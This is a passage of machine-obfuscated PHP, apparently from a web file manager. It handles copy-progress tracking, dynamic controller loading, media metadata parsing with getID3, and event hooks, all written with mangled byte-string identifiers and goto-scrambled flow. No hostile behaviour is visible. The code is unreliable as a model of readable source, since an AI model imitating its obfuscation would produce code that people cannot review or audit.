($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1462]] + $AÇÒŒ½›†Ë) / $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[698]]; $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1413]] = $déâêö¦¢ * 0.3; } else { if ($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1480]] == $aƒÔÑ‚Ò¹§[298]) { $déâêö¦¢ = $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[986]] / $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[974]]; $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1413]] = 0.3 + $déâêö¦¢ * 0.5; } else { if ($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1480]] == $aƒÔÑ‚Ò¹§[91]) { $déâêö¦¢ = 0; if ($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1457]]) { $déâêö¦¢ = $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1458]] / $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1457]]; } $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1413]] = 0.3 + 0.5 + $déâêö¦¢ * 0.2; } } } if ($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1413]] > 0) { $E†Îµ¤ëŠ³ = timeFloat() - $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1415]] - $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1418]]; $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1419]] = $E†Îµ¤ëŠ³ * (1 - $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1413]]) / $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1413]]; } } public function copyFileStart($b¿ÊóâšÇÈ, $CÓ¿‘Â©À , $E²í¦¾‘Å, $cŒâÍñÑ”, $cª©Î””—³, $c“œ‘­Â) { $aß“·‡¬ÂÀ =& $_SERVER[¢à]; parent::copyFileStart($b¿ÊóâšÇÈ, $CÓ¿‘Â©À , $E²í¦¾‘Å, $cŒâÍñÑ”, $cª©Î””—³, $c“œ‘­Â); $DÈé†Ğù»ß =& $this->task; if ($DÈé†Ğù»ß[$aß“·‡¬ÂÀ[1480]] == $aß“·‡¬ÂÀ[298]) { $DÈé†Ğù»ß[$aß“·‡¬ÂÀ[1480]] = $aß“·‡¬ÂÀ[91]; } $this->update(); } public function copyFileEnd($E‹„Ã¤Š”, $B®ÁŠ´›âğ, $f¹ÛğíåçÒ, $Bìòì°ÂØ, $Fœğ£‚ãŒô, $C‚ê¶ÀˆÀï) { $dâÓÊšªàÉ =& $_SERVER[¢à]; $eÅÄ‘’ŞŒî =& $this->task; $eÅÄ‘’ŞŒî[$dâÓÊšªàÉ[1458]] = $eÅÄ‘’ŞŒî[$dâÓÊšªàÉ[1457]]; $eÅÄ‘’ŞŒî[$dâÓÊšªàÉ[1462]] += $eÅÄ‘’ŞŒî[$dâÓÊšªàÉ[1457]]; $eÅÄ‘’ŞŒî[$dâÓÊšªàÉ[1459]] = $dâÓÊšªàÉ[33]; $this->update(); } public function nameParse($B±ƒÃİØê) { $aÂ±åÑÔ›ä =& $_SERVER[¢à]; $aÏªÛ»é„Œ =& $this->task; if ($aÏªÛ»é„Œ[$aÂ±åÑÔ›ä[986]] < $aÏªÛ»é„Œ[$aÂ±åÑÔ›ä[974]]) { $FƒĞÎïÉä = get_path_this($B±ƒÃİØê); if (strstr($FƒĞÎïÉä, $aÂ±åÑÔ›ä[93])) { $aÏªÛ»é„Œ[$aÂ±åÑÔ›ä[986]] += 1; } } if ($aÏªÛ»é„Œ[$aÂ±åÑÔ›ä[1480]] == $aÂ±åÑÔ›ä[1036]) { $aÏªÛ»é„Œ[$aÂ±åÑÔ›ä[1480]] = $aÂ±åÑÔ›ä[298]; } $aÏªÛ»é„Œ[$aÂ±åÑÔ›ä[1455]] = $B±ƒÃİØê; $this->update(); } } goto eáóôğÌ»ô; d¯ùö¸‡Ò: function Action($Bˆ³†ØÌò· = '') { goto D÷ª† íŒë; dîñ«£‹É: $DŠØ£»Ïá = strtolower($BÄŸÓ‘Ùìƒ); if (isset($b‰öƒ§ó§[$DŠØ£»Ïá])) { return $b‰öƒ§ó§[$DŠØ£»Ïá]; } if (is_file($a·Œ¬ŸêîÆ)) { include_once $a·Œ¬ŸêîÆ; } goto dÊáˆäƒ°ä; dÊáˆäƒ°ä: if (!class_exists($BÄŸÓ‘Ùìƒ)) { return actionCallError("\x5b{$Bˆ³†ØÌò·}\40\x3d\x3e\x20{$BÄŸÓ‘Ùìƒ}\135\40\x63\x6c\x61\163\163\40\156\157\164\x20\x65\170\151\x73\x74\163\41"); } $b‰öƒ§ó§[$DŠØ£»Ïá] = new $BÄŸÓ‘Ùìƒ(); return $b‰öƒ§ó§[$DŠØ£»Ïá]; goto A ÏĞ¹×¥â; FÖ§›˜Øİ: $D”èË‰×Ò = explode($BŒù»ÓÀÈ[5], $Bˆ³†ØÌò·); $BÀÌñçÆ†ø = strtolower($D”èË‰×Ò[0]); if (substr($BÀÌñçÆ†ø, -6) == $BŒù»ÓÀÈ[6]) { $Bˆ³†ØÌò· = substr($D”èË‰×Ò[0], 0, -6); $BÄŸÓ‘Ùìƒ = $Bˆ³†ØÌò· . $BŒù»ÓÀÈ[7]; $a·Œ¬ŸêîÆ = $BŒù»ÓÀÈ[8]; if (isset($D”èË‰×Ò[1]) && substr(strtolower($D”èË‰×Ò[1]), -5) == $BŒù»ÓÀÈ[9]) { $BÄŸÓ‘Ùìƒ = $Bˆ³†ØÌò· . $D”èË‰×Ò[1]; $a·Œ¬ŸêîÆ = $BŒù»ÓÀÈ[10] . $D”èË‰×Ò[1] . $BŒù»ÓÀÈ[11]; } else { if (count($D”èË‰×Ò) == 3) { $BÄŸÓ‘Ùìƒ = $Bˆ³†ØÌò· . $D”èË‰×Ò[1] . $D”èË‰×Ò[2]; $a·Œ¬ŸêîÆ = $BŒù»ÓÀÈ[12] . $D”èË‰×Ò[1] . $BŒù»ÓÀÈ[13] . $D”èË‰×Ò[2] . $BŒù»ÓÀÈ[11]; } } $a·Œ¬ŸêîÆ = PLUGIN_DIR . $Bˆ³†ØÌò· . $BŒù»ÓÀÈ[4] . $a·Œ¬ŸêîÆ; } else { if (substr($BÀÌñçÆ†ø, -5) == $BŒù»ÓÀÈ[9]) { $Bˆ³†ØÌò· = substr($D”èË‰×Ò[0], 0, -5); return Model($Bˆ³†ØÌò·); } else { $BÄŸÓ‘Ùìƒ = $D”èË‰×Ò[0] . $D”èË‰×Ò[1]; $a·Œ¬ŸêîÆ = CONTROLLER_DIR . $D”èË‰×Ò[0] . $BŒù»ÓÀÈ[4] . $D”èË‰×Ò[1] . $BŒù»ÓÀÈ[14]; } } goto dîñ«£‹É; D÷ª† íŒë: $BŒù»ÓÀÈ =& $_SERVER[‚¬û]; static $b‰öƒ§ó§ = array(); $Bˆ³†ØÌò· = trim(str_replace($BŒù»ÓÀÈ[4], $BŒù»ÓÀÈ[5], $Bˆ³†ØÌò·), $BŒù»ÓÀÈ[4]); goto FÖ§›˜Øİ; A ÏĞ¹×¥â: } function ActionApply($F­©­Ùˆøö, $AÎÔ‹œæÛ = array()) { goto fÏ¥÷ëÔç; CÄé»ÚÉÆ: $bµ©î‚ÕÕ² = substr($F­©­Ùˆøö, 0, $aù”Ê—èº); $c…°â’¥ë = substr($F­©­Ùˆøö, $aù”Ê—èº + 1); $eÍ±ˆĞˆŠ = Action($bµ©î‚ÕÕ²); goto A„Ó¼‚½¸‡; A„Ó¼‚½¸‡: if (!method_exists($eÍ±ˆĞˆŠ, $c…°â’¥ë)) { return actionCallError("{$F­©­Ùˆøö}\40\155\x65\x74\150\157\144\40\x6e\x6f\164\x20\x65\x78\151\163\164\x73\x21"); } $Eæ–Ü®ë“ = call_user_func_array(array($eÍ±ˆĞˆŠ, $c…°â’¥ë), $AÎÔ‹œæÛ); return $Eæ–Ü®ë“; goto bîÜÃ¨‡Íé; fÏ¥÷ëÔç: if (is_array($F­©­Ùˆøö)) { return call_user_func_array($F­©­Ùˆøö, $AÎÔ‹œæÛ); } if (function_exists($F­©­Ùˆøö)) { return call_user_func_array($F­©­Ùˆøö, $AÎÔ‹œæÛ); } $aù”Ê—èº = strrpos($F­©­Ùˆøö, $_SERVER[‚¬û][5]); goto CÄé»ÚÉÆ; bîÜÃ¨‡Íé: } function actionCallError($cèàÁÉÒææ) { $BÉÖ£¶£Ÿ  =& $_SERVER[‚¬û]; $e¢‰Œ Ú¼¸ = json_encode_force(array($BÉÖ£¶£Ÿ [15] => this_url(), $BÉÖ£¶£Ÿ [16] => $GLOBALS[$BÉÖ£¶£Ÿ [16]])); $e¢‰Œ Ú¼¸ = str_replace(array($BÉÖ£¶£Ÿ [17]), array($BÉÖ£¶£Ÿ [4]), $e¢‰Œ Ú¼¸); return write_log($cèàÁÉÒææ . $BÉÖ£¶£Ÿ [18] . $e¢‰Œ Ú¼¸, $BÉÖ£¶£Ÿ [19]); } goto DÇŠĞ‹‰±Š; C«éœ¬İ‰‚: class GetInfo { private static $fileTypeArray; public static function get($C¡ğîº¿ê) { $d‘í³‰Şã = IO::info($C¡ğîº¿ê); return self::infoAdd($d‘í³‰Şã); } public static function infoAdd(&$E”Ş©“™‚Ä) { goto f­ƒŞ¯‚Á; B°ËÅ­âã: $Fœªº¢–éÎ[$eëˆ·ã“[369]] = $eàõ¨¨»´; $E”Ş©“™‚Ä[$eëˆ·ã“[422]] = $Fœªº¢–éÎ; return $E”Ş©“™‚Ä; goto F†É¥óÔŸˆ; AôŸ´”–‡: if (!$E”Ş©“™‚Ä || $E”Ş©“™‚Ä[$eëˆ·ã“[29]] != $eëˆ·ã“[164]) { return; } if (!self::support($E”Ş©“™‚Ä[$eëˆ·ã“[157]]) || isset($E”Ş©“™‚Ä[$eëˆ·ã“[422]])) { return; } $E‚íÇˆ¥©Ã = $eëˆ·ã“[1584] . $E”Ş©“™‚Ä[$eëˆ·ã“[75]]; goto F˜Æí‚Ş¹½; F˜Æí‚Ş¹½: $eàõ¨¨»´ = $E”Ş©“™‚Ä[$eëˆ·ã“[157]]; try { if ($E”Ş©“™‚Ä[$eëˆ·ã“[157]] == $eëˆ·ã“[1585]) { $Fœªº¢–éÎ = self::psdParse($E‚íÇˆ¥©Ã); $eàõ¨¨»´ = $eëˆ·ã“[1586]; } else { if ($E”Ş©“™‚Ä[$eëˆ·ã“[157]] == $eëˆ·ã“[1587]) { $Fœªº¢–éÎ = self::pdfParse($E‚íÇˆ¥©Ã); } else { $eàõ¨¨»´ = self::$fileTypeArray[$eëˆ·ã“[1588]][$E”Ş©“™‚Ä[$eëˆ·ã“[157]]]; $F„‰õ´¤ª˜ = self::$fileTypeArray[$eëˆ·ã“[1589]][$eàõ¨¨»´][$eëˆ·ã“[1590]]; $aÈƒ®¸òï = @$AŒ¨—°À¬ƒ->analyze($E‚íÇˆ¥©Ã, $E”Ş©“™‚Ä[$eëˆ·ã“[77]], $E”Ş©“™‚Ä[$eëˆ·ã“[28]]); $Fœªº¢–éÎ = self::parseData($aÈƒ®¸òï, $F„‰õ´¤ª˜, $E”Ş©“™‚Ä); } } } catch (Exception $bÔÀ¦ê…Áõ) { $Fœªº¢–éÎ = array($eëˆ·ã“[369] => $eàõ¨¨»´); } if (!$Fœªº¢–éÎ) { return; } goto B°ËÅ­âã; f­ƒŞ¯‚Á: $eëˆ·ã“ =& $_SERVER[¢à]; static $AŒ¨—°À¬ƒ; if (!$AŒ¨—°À¬ƒ) { require SDK_DIR . $eëˆ·ã“[1583]; $AŒ¨—°À¬ƒ = new getID3(); } goto AôŸ´”–‡; F†É¥óÔŸˆ: } public static function support($b¹‘ß‚†¬) { goto f‘¢»ÈßäÖ; Dš×Ğå‹…à: $B—ÒÊ®ŠÜ = array($cÈ›¡™“Ïµ[1587], $cÈ›¡™“Ïµ[1585]); if (in_array($b¹‘ß‚†¬, $B—ÒÊ®ŠÜ)) { return !0; } if (isset(self::$fileTypeArray[$cÈ›¡™“Ïµ[1588]][$b¹‘ß‚†¬])) { return !0; } goto F‚ˆ‡ÌšœÜ; f‘¢»ÈßäÖ: $cÈ›¡™“Ïµ =& $_SERVER[¢à]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $b¹‘ß‚†¬ = strtolower($b¹‘ß‚†¬); goto Dš×Ğå‹…à; F‚ˆ‡ÌšœÜ: return !1; goto bÓ‘ÏÉ¤×í; bÓ‘ÏÉ¤×í: } private static function parseData($cÏá…ñ“Ñ‹, $E¸Ÿ½¬—ÛÙ, $BÚ„Ì‘ŒÈ‡) { $c‘‰¡‡ÅÑ¸ =& $_SERVER[¢à]; $DÔ÷‚Šô‰… = $cÏá…ñ“Ñ‹[$c‘‰¡‡ÅÑ¸[1591]]; $d•–Ãßòå = array(); foreach ($E¸Ÿ½¬—ÛÙ as $Dòù¶£®§ => $CˆÀˆÎóôÆ) { foreach ($CˆÀˆÎóôÆ as $C÷¤ÎŒ–Ò‘) { if (is_array($C÷¤ÎŒ–Ò‘)) { $AâóÑâ° = self::parseData($cÏá…ñ“Ñ‹, $CˆÀˆÎóôÆ, $BÚ„Ì‘ŒÈ‡); if ($AâóÑâ°) { $d•–Ãßòå[$Dòù¶£®§] = $AâóÑâ°; } break; } $A®âæ…ñÎÍ = str_replace($c‘‰¡‡ÅÑ¸[1365], $DÔ÷‚Šô‰…, $C÷¤ÎŒ–Ò‘); $AâóÑâ° = _get($cÏá…ñ“Ñ‹, $A®âæ…ñÎÍ); $AâóÑâ° = is_array($AâóÑâ°) ? $AâóÑâ°[0] : $AâóÑâ°; if ($AâóÑâ°) { break; } } if ($AâóÑâ° || $AâóÑâ° === 0 || $AâóÑâ° === !1) { $AâóÑâ° = self::valueReset($C÷¤ÎŒ–Ò‘, $AâóÑâ°, $Dòù¶£®§); if ($AâóÑâ° !== null) { $d•–Ãßòå[$Dòù¶£®§] = $AâóÑâ°; } } } $d•–Ãßòå = self::valueResetAll($d•–Ãßòå, $BÚ„Ì‘ŒÈ‡); return $d•–Ãßòå; } private static function psdParse($B¯¸ÓÅÙùƒ) { $eİá ±è† =& $_SERVER[¢à]; if (IO::fileSubstr($B¯¸ÓÅÙùƒ, 0, 4) != $eİá ±è†[1592]) { return !1; } $CŒ…¾¦÷µ³ = getImageSize($B¯¸ÓÅÙùƒ, $dõÈì‡Û³); if (!$CŒ…¾¦÷µ³) { return; } $f¯»·õ¥Ïõ = array($eİá ±è†[1507] => $CŒ…¾¦÷µ³[0], $eİá ±è†[1509] => $CŒ…¾¦÷µ³[1]); return $f¯»·õ¥Ïõ; } private static function pdfParse($A­™‡ëŸÎ) { return FileParsePdf::parse($A­™‡ëŸÎ); } private static function fileTypeParse() { $C±æ•ïößè =& $_SERVER[¢à]; $F‡‘ŞÃØòÃ = self::fileTypeArray(); $a‡¢Ûª™à® = array(); foreach ($F‡‘ŞÃØòÃ as $BÙ¢‹‰Š‘© => $c”ğ“¸Ê§É) { $F©Ã  – = _get($c”ğ“¸Ê§É, $C±æ•ïößè[157], $C±æ•ïößè[33]); $Eğ¼ÌË²©‰ = is_string($F©Ã  –) ? explode($C±æ•ïößè[47], $F©Ã  –) : $F©Ã  –; if (!$Eğ¼ÌË²©‰) { continue; } foreach ($Eğ¼ÌË²©‰ as $F©Ã  –) { $F©Ã  – = strtolower(trim($F©Ã  –)); if (!$F©Ã  –) { continue; } $a‡¢Ûª™à®[$F©Ã  –] = $BÙ¢‹‰Š‘©; } $F‡‘ŞÃØòÃ[$BÙ¢‹‰Š‘©][$C±æ•ïößè[157]] = array_keys($a‡¢Ûª™à®); $F‡‘ŞÃØòÃ[$BÙ¢‹‰Š‘©][$C±æ•ïößè[1590]] = self::parseKeyMap($c”ğ“¸Ê§É[$C±æ•ïößè[1590]]); } return array($C±æ•ïößè[1589] => $F‡‘ŞÃØòÃ, $C±æ•ïößè[1588] => $a‡¢Ûª™à®); } private static function parseKeyMap($e‡ãõ¬ÀÄñ) { $f‚¬¦Õ…Ñğ =& $_SERVER[¢à]; foreach ($e‡ãõ¬ÀÄñ as $E­Şåöˆæ‰ => $C£ŠÚÖßµ) { if (is_array($C£ŠÚÖßµ)) { $bæ†ôŒÈº = self::parseKeyMap($C£ŠÚÖßµ); if ($bæ†ôŒÈº) { $e‡ãõ¬ÀÄñ[$E­Şåöˆæ‰] = $bæ†ôŒÈº; } continue; } $CŞÍÍßõï = explode($f‚¬¦Õ…Ñğ[47], $C£ŠÚÖßµ); $Aç÷ÒùÔ ø = array(); foreach ($CŞÍÍßõï as $F¦ç¯±ˆñ´) { $F¦ç¯±ˆñ´ = trim($F¦ç¯±ˆñ´); if (!$F¦ç¯±ˆñ´) { continue; } if (preg_match($f‚¬¦Õ…Ñğ[1593], $F¦ç¯±ˆñ´, $Fë±æë¶“)) { $C•Š·¬ªç† = explode($f‚¬¦Õ…Ñğ[268], $Fë±æë¶“[1]); foreach ($C•Š·¬ªç† as $f»»á§Å‚œ) { $Aç÷ÒùÔ ø[] = str_replace($Fë±æë¶“[0], $f»»á§Å‚œ, $F¦ç¯±ˆñ´); } } else { $Aç÷ÒùÔ ø[] = $F¦ç¯±ˆñ´; } } $e‡ãõ¬ÀÄñ[$E­Şåöˆæ‰] = $Aç÷ÒùÔ ø; } return $e‡ãõ¬ÀÄñ; } private static function valueResetAll($BÄÙŠáÕù, $FÁù…á¹İ§) { goto aÈŒğšÙÌà; aÈŒğšÙÌà: $C§àÉ”ÒÍ =& $_SERVER[¢à]; if (isset($BÄÙŠáÕù[$C§àÉ”ÒÍ[1594]])) { $b¾¯è§µé = ceil($BÄÙŠáÕù[$C§àÉ”ÒÍ[1594]]); $Bãƒãä£­ = intval($b¾¯è§µé / 3600); $D‘ĞÖƒÒì = intval(($b¾¯è§µé - $Bãƒãä£­ * 3600) / 60); $eã‹ºëİò = $b¾¯è§µé % 60; $BÄÙŠáÕù[$C§àÉ”ÒÍ[1595]] = sprintf($C§àÉ”ÒÍ[1596], $Bãƒãä£­, $D‘ĞÖƒÒì, $eã‹ºëİò); if ($Bãƒãä£­ == 0) { $BÄÙŠáÕù[$C§àÉ”ÒÍ[1595]] = sprintf($C§àÉ”ÒÍ[1597], $D‘ĞÖƒÒì, $eã‹ºëİò); } } $A…­ÛÏ¡Âº = _get($BÄÙŠáÕù, $C§àÉ”ÒÍ[1598]); goto CÌÎòÑ¤æ­; CÌÎòÑ¤æ­: if ($A…­ÛÏ¡Âº) { $C†ğƒ¶÷Ò = IO_PATH_SYSTEM_TEMP . $C§àÉ”ÒÍ[1599] . KodIO::hashPath($FÁù…á¹İ§) . $C§àÉ”ÒÍ[1600]; $BÄÙŠáÕù[$C§àÉ”ÒÍ[1601]] = Action($C§àÉ”ÒÍ[1602])->pluginCacheFileSet($C†ğƒ¶÷Ò, $A…­ÛÏ¡Âº); unset($BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1586]]); } $BÑªŠÎ°Ï¬ = _get($BÄÙŠáÕù, $C§àÉ”ÒÍ[1604], $C§àÉ”ÒÍ[33]); $Cñª¢œ˜öÁ = _get($BÄÙŠáÕù, $C§àÉ”ÒÍ[1605], $C§àÉ”ÒÍ[33]); goto eĞğ«Ôğä; bÁñ¨“¼”Ë: return $BÄÙŠáÕù; goto bÂ—Â©Üâ; eĞğ«Ôğä: $B¥£òØ¸˜ó = _get($BÄÙŠáÕù, $C§àÉ”ÒÍ[1606], $C§àÉ”ÒÍ[33]); $C¡·¦‘¥ã = $BÑªŠÎ°Ï¬ . $Cñª¢œ˜öÁ . $B¥£òØ¸˜ó; if ($C¡·¦‘¥ã && get_charset($C¡·¦‘¥ã) != $C§àÉ”ÒÍ[323]) { $BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1317]] = iconv_to($BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1317]], get_charset($C¡·¦‘¥ã), $C§àÉ”ÒÍ[323]); $BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1607]] = iconv_to($BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1607]], get_charset($C¡·¦‘¥ã), $C§àÉ”ÒÍ[323]); $BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1608]] = iconv_to($BÄÙŠáÕù[$C§àÉ”ÒÍ[1603]][$C§àÉ”ÒÍ[1608]], get_charset($C¡·¦‘¥ã), $C§àÉ”ÒÍ[323]); } goto bÁñ¨“¼”Ë; bÂ—Â©Üâ: } private static function valueReset($A›ˆì¯ö”¨, $f¼ñ·Î¦Ê”, $EóˆğŠ‘É×) { $Aæ•¡¸ =& $_SERVER[¢à]; $B‡êÍøêŒª = $Aæ•¡¸[1524]; switch ($A›ˆì¯ö”¨) { case $Aæ•¡¸[1609]: $f¼ñ·Î¦Ê” = $f¼ñ·Î¦Ê” == $Aæ•¡¸[83] ? $Aæ•¡¸[1610] : $Aæ•¡¸[1611]; break; case $Aæ•¡¸[1612]: $f¼ñ·Î¦Ê” = $f¼ñ·Î¦Ê” ? $f¼ñ·Î¦Ê” : null; break; default: break; } switch ($EóˆğŠ‘É×) { case $Aæ•¡¸[1613]: $f¼ñ·Î¦Ê” = round($f¼ñ·Î¦Ê”, 2); break; case $Aæ•¡¸[184]: case $Aæ•¡¸[107]: if ($f¼ñ·Î¦Ê” < 0) { $f¼ñ·Î¦Ê” = null; } else { if (is_numeric($f¼ñ·Î¦Ê”)) { $f¼ñ·Î¦Ê” = date($B‡êÍøêŒª, $f¼ñ·Î¦Ê”); } } break; default: break; } return $f¼ñ·Î¦Ê”; } private static function fileTypeArray() { $BØßÌ’Å² =& $_SERVER[¢à]; return array($BØßÌ’Å²[1586] => array($BØßÌ’Å²[157] => $BØßÌ’Å²[1614] . $BØßÌ’Å²[1615], $BØßÌ’Å²[1590] => array($BØßÌ’Å²[1507] => $BØßÌ’Å²[1616], $BØßÌ’Å²[1509] => $BØßÌ’Å²[1617], $BØßÌ’Å²[1618] => $BØßÌ’Å²[1619], $BØßÌ’Å²[1620] => $BØßÌ’Å²[1621], $BØßÌ’Å²[184] => $BØßÌ’Å²[1622], $BØßÌ’Å²[107] => $BØßÌ’Å²[1623], $BØßÌ’Å²[1624] => $BØßÌ’Å²[1625], $BØßÌ’Å²[1626] => $BØßÌ’Å²[1627], $BØßÌ’Å²[1628] => $BØßÌ’Å²[1629], $BØßÌ’Å²[1630] => $BØßÌ’Å²[1631], $BØßÌ’Å²[1632] => $BØßÌ’Å²[1633], $BØßÌ’Å²[1634] => $BØßÌ’Å²[1635], $BØßÌ’Å²[1636] => $BØßÌ’Å²[1637], $BØßÌ’Å²[1638] => array($BØßÌ’Å²[1639] => $BØßÌ’Å²[1640], $BØßÌ’Å²[1641] => $BØßÌ’Å²[1642], $BØßÌ’Å²[1643] => $BØßÌ’Å²[1644]), $BØßÌ’Å²[1645] => $BØßÌ’Å²[1646], $BØßÌ’Å²[1647] => $BØßÌ’Å²[1648], $BØßÌ’Å²[1649] => $BØßÌ’Å²[1650], $BØßÌ’Å²[1651] => $BØßÌ’Å²[1652], $BØßÌ’Å²[1653] => array($BØßÌ’Å²[1654] => $BØßÌ’Å²[1655], $BØßÌ’Å²[1656] => $BØßÌ’Å²[1657], $BØßÌ’Å²[1658] => $BØßÌ’Å²[1659], $BØßÌ’Å²[1660] => $BØßÌ’Å²[1661], $BØßÌ’Å²[1662] => $BØßÌ’Å²[1663], $BØßÌ’Å²[1664] => $BØßÌ’Å²[1665], $BØßÌ’Å²[1666] => $BØßÌ’Å²[1667], $BØßÌ’Å²[1668] => $BØßÌ’Å²[1669], $BØßÌ’Å²[1670] => $BØßÌ’Å²[1671], $BØßÌ’Å²[1672] => $BØßÌ’Å²[1673], $BØßÌ’Å²[1674] => $BØßÌ’Å²[1675]))), $BØßÌ’Å²[1676] => array($BØßÌ’Å²[157] => $BØßÌ’Å²[1677] . $BØßÌ’Å²[1678], $BØßÌ’Å²[1590] => array($BØßÌ’Å²[1594] => $BØßÌ’Å²[1679], $BØßÌ’Å²[184] => $BØßÌ’Å²[1680], $BØßÌ’Å²[107] => $BØßÌ’Å²[1681], $BØßÌ’Å²[1626] => $BØßÌ’Å²[1682], $BØßÌ’Å²[1683] => $BØßÌ’Å²[1684], $BØßÌ’Å²[1685] => $BØßÌ’Å²[1612], $BØßÌ’Å²[1686] => $BØßÌ’Å²[1687], $BØßÌ’Å²[1688] => $BØßÌ’Å²[1689], $BØßÌ’Å²[1690] => $BØßÌ’Å²[1691], $BØßÌ’Å²[1603] => array($BØßÌ’Å²[1317] => $BØßÌ’Å²[1692], $BØßÌ’Å²[1607] => $BØßÌ’Å²[1693], $BØßÌ’Å²[1608] => $BØßÌ’Å²[1694], $BØßÌ’Å²[1695] => $BØßÌ’Å²[1696], $BØßÌ’Å²[1697] => $BØßÌ’Å²[1698], $BØßÌ’Å²[1699] => $BØßÌ’Å²[1700], $BØßÌ’Å²[1586] => $BØßÌ’Å²[1701]))), $BØßÌ’Å²[1702] => array($BØßÌ’Å²[157] => $BØßÌ’Å²[1703] . $BØßÌ’Å²[1704], $BØßÌ’Å²[1590] => array($BØßÌ’Å²[1507] => $BØßÌ’Å²[1705], $BØßÌ’Å²[1509] => $BØßÌ’Å²[1706], $BØßÌ’Å²[1594] => $BØßÌ’Å²[1679], $BØßÌ’Å²[184] => $BØßÌ’Å²[1707], $BØßÌ’Å²[107] => $BØßÌ’Å²[1708], $BØßÌ’Å²[1613] => $BØßÌ’Å²[1709], $BØßÌ’Å²[1690] => $BØßÌ’Å²[1710], $BØßÌ’Å²[1686] => $BØßÌ’Å²[1711], $BØßÌ’Å²[1626] => $BØßÌ’Å²[1712], $BØßÌ’Å²[1676] => array($BØßÌ’Å²[1685] => $BØßÌ’Å²[1612], $BØßÌ’Å²[1713] => $BØßÌ’Å²[1714], $BØßÌ’Å²[1683] => $BØßÌ’Å²[1684], $BØßÌ’Å²[1690] => $BØßÌ’Å²[1691], $BØßÌ’Å²[1686] => $BØßÌ’Å²[1715], $BØßÌ’Å²[1688] => $BØßÌ’Å²[1689]))), $BØßÌ’Å²[1716] => array($BØßÌ’Å²[1590] => array($BØßÌ’Å²[1717] => $BØßÌ’Å²[1718], $BØßÌ’Å²[1719] => $BØßÌ’Å²[1720])), $BØßÌ’Å²[1721] => array($BØßÌ’Å²[1590] => array())); } } class Hook { private static $events = array(); public static function get($aº¶¹Ş©¥œ = false) { if (!$aº¶¹Ş©¥œ) { return self::$events; } else { return self::$events[$aº¶¹Ş©¥œ]; } } public static function apply($BĞ¥´¦§ğ, $Dƒƒ„ĞÉ‰á = array()) { $CóĞÇàõÔ“ = ActionApply($BĞ¥´¦§ğ, $Dƒƒ„ĞÉ‰á); if (is_string($BĞ¥´¦§ğ)) { Hook::trigger($BĞ¥´¦§ğ); } return $CóĞÇàõÔ“; } public static function bind($ašíİ“êµ¢, $fù—·ÕèË°, $C”•Éæğİ = false) { $C¶ö†¥ğï =& $_SERVER[¢à]; if (!isset(self::$events[$ašíİ“êµ¢])) { self::$events[$ašíİ“êµ¢] = array(); } self::$events[$ašíİ“êµ¢][] = array($C¶ö†¥ğï[1722] => $fù—·ÕèË°, $C¶ö†¥ğï[1723] => $C”•Éæğİ, $C¶ö†¥ğï[1724] => 0); } public static function once($bé§à§›ïù, $FÅÓšî•áæ) { self::bind($bé§à§›ïù, $FÅÓšî•áæ, !0); } public static function unbind($F¼÷ò§‚“ù, $Cê‘¨‡ªĞÁ = false) { if (!$Cê‘¨‡ªĞÁ) { self::$events[$F¼÷ò§‚“ù] = array(); return; } $a¡±›äèß÷ = self::$events[$F¼÷ò§‚“ù]; self::$events[$F¼÷ò§‚“ù] = array(); if (!is_array($a¡±›äèß÷)) { return; } for ($E¢ŞŸÃ¢±§ = 0; $E¢ŞŸÃ¢±§ < count($a¡±›äèß÷); $E¢ŞŸÃ¢±§++) { if ($a¡±›äèß÷[$E¢ŞŸÃ¢±§][$_SERVER[¢à][1722]] == $Cê‘¨‡ªĞÁ) { continue; } self::$events[$F¼÷ò§‚“ù][] = $a¡±›äèß÷[$E¢ŞŸÃ¢±§]; } } public static function filter($C†“¦çÊİ, $CÎ•œ÷‡«¬) { goto BÈÍØ—‘Ğ–; a¦©²±ë‹: $eâ¸˜èï³² = $F‰šÉ­™²[$C†“¦çÊİ]; $B˜š©×İ‚Ë = $CÎ•œ÷‡«¬; if (!is_array($eâ¸˜èï³²) || count($eâ¸˜èï³²) == 0) { return $B˜š©×İ‚Ë; } goto A¼ä«Ş¾¤Ä; A¼ä«Ş¾¤Ä: for ($F²»³ƒÚ¯Æ = 0; $F²»³ƒÚ¯Æ < count($eâ¸˜èï³²); $F²»³ƒÚ¯Æ++) { $c¯‘ÄÁïÕ• = $eâ¸˜èï³²[$F²»³ƒÚ¯Æ]; if ($c¯‘ÄÁïÕ•[$fµæƒò´ó³[1723]] && $c¯‘ÄÁïÕ•[$fµæƒò´ó³[1724]] > 1) { continue; } self::$events[$C†“¦çÊİ][$F²»³ƒÚ¯Æ][$fµæƒò´ó³[1724]] = $c¯‘ÄÁïÕ•[$fµæƒò´ó³[1724]] + 1; $bã‚¬ÃØ = self::apply($c¯‘ÄÁïÕ•[$fµæƒò´ó³[1722]], array($B˜š©×İ‚Ë)); if (!is_null($bã‚¬ÃØ)) { $B˜š©×İ‚Ë = $bã‚¬ÃØ; } } return $B˜š©×İ‚Ë; goto e‚¹ù©ê×¹; 